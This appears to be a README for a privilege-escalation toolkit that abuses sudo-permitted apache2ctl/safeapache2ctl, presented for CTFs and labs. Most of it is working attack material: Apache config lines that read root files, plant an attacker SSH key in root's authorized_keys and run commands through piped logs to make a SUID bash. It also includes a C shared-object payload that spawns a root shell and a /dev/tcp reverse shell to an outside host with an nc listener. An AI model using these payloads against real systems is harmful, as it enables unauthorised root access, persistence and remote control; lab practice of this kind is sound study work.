

# 🔥 Apachectl / SafeApache2ctl Privilege Escalation Toolkit (..beta..)

This toolkit (`apache-privesc-helper.sh`) automates exploitation of misconfigured **`apache2ctl` / `safeapache2ctl`** binaries in CTFs or misconfig labs.

If you can run Apache as root with a custom config via `sudo`, 
you can abuse directives like `Include`, `CustomLog`, `ErrorLog`, and `LoadFile` to **read**, **write**, and **execute** as root.

---

## 🕵️ Enumeration

1. **Check sudo rights:**

   ```bash
   sudo -l
   ```

   Look for:

   ```
   (ALL) NOPASSWD: /usr/local/bin/apache2ctl
   (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
   ```

2. **Confirm version / binary:**

   ```bash
   which apache2ctl
   which safeapache2ctl
   ```

3. **Test a minimal config:**

   ```apache
   ServerRoot "/etc/apache2"
   PidFile "/tmp/httpd.pid"
   ErrorLog "/tmp/apache_error.log"
   Listen 8080
   LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
   ```

   Run with:

   ```bash
   sudo /usr/local/bin/safeapache2ctl -f ./test.conf configtest
   ```

---

## 🚀 Exploitation Techniques

### 📖 File Read — `Include`

Read sensitive files like `/root/root.txt`:

```apache
Include /root/root.txt
```

Run:

```bash
sudo /usr/local/bin/safeapache2ctl -f ./readflag.conf configtest
```

➡ File contents show in the error output.

---

### ✍️ File Write — `CustomLog`

Write SSH pubkey into root’s `authorized_keys`:

```apache
CustomLog "/root/.ssh/authorized_keys" "ssh-ed25519 AAAAC3Nz... attacker@kali"
```

Safer append mode (avoid overwrite):

```apache
CustomLog "|/bin/sh -c 'cat >> /root/.ssh/authorized_keys'" "ssh-ed25519 AAAAC3Nz..."
```

---

### 💥 Command Execution — `ErrorLog` Pipe

Run commands as root:

```apache
ErrorLog "|/bin/sh -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'"
```

➡ Get a SUID root shell:

```bash
/tmp/rootbash -p
```

---

### 🧩 Code Execution — `LoadFile`

Load a malicious `.so` with a constructor payload:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void run() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```

Build:

```bash
gcc -fPIC -shared -o root.so root.c
```

Config:

```apache
LoadFile /home/user/root.so
```

➡ Root shell on execution.

---

### 📡 Reverse Shell — `ErrorLog`

Spawn a reverse shell:

```apache
ErrorLog "|/bin/sh -c 'bash -i >& /dev/tcp/10.10.14.42/4444 0>&1'"
```

Attacker:

```bash
nc -lvnp 4444
```

---

## ⚙️ The Helper Script

`apache-privesc-helper.sh` automates all of the above.

### Install

```bash
chmod +x apache-privesc-helper.sh
```

### Usage

```bash
./apache-privesc-helper.sh [mode] [args...]
```

#### Modes:

* **`so`** → Build `.so` root shell payload and config (LoadFile)
* **`key <pubkey>`** → Build CustomLog config to drop SSH pubkey
* **`cmd <command>`** → Build ErrorLog config to run arbitrary command
* **`rev <LHOST> <LPORT>`** → Build ErrorLog reverse shell config
* **`read <file>`** → Build Include config to read a file
* **`clean`** → Remove all artifacts (configs, payloads, SUID bash)

---

### 🔧 Examples

* Build `.so` root payload:

  ```bash
  ./apache-privesc-helper.sh so
  sudo /usr/local/bin/safeapache2ctl -f /tmp/apache_privesc/payload.conf start
  ```

* Drop SSH pubkey:

  ```bash
  ./apache-privesc-helper.sh key "ssh-ed25519 AAAAC3Nz... attacker@kali"
  ```

* Run a command (SUID bash):

  ```bash
  ./apache-privesc-helper.sh cmd "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
  sudo /usr/local/bin/safeapache2ctl -f /tmp/apache_privesc/payload.conf start
  /tmp/rootbash -p
  ```

* Reverse shell:

  ```bash
  nc -lvnp 4444          # on attacker
  ./apache-privesc-helper.sh rev 10.10.14.42 4444
  sudo /usr/local/bin/safeapache2ctl -f /tmp/apache_privesc/payload.conf start
  ```

* Read `/root/root.txt`:

  ```bash
  ./apache-privesc-helper.sh read /root/root.txt
  sudo /usr/local/bin/safeapache2ctl -f /tmp/apache_privesc/payload.conf configtest
  ```

* Cleanup:

  ```bash
  ./apache-privesc-helper.sh clean
  ```

---

## 🧹 Cleanup

When done, always wipe payloads and configs:

```bash
./apache-privesc-helper.sh clean
```

This removes:

* `/tmp/apache_privesc/root.so`
* `/tmp/apache_privesc/root.c`
* `/tmp/apache_privesc/payload.conf`
* `/tmp/rootbash` (SUID shell)
* `/tmp/apache_error.log`

---

##
##
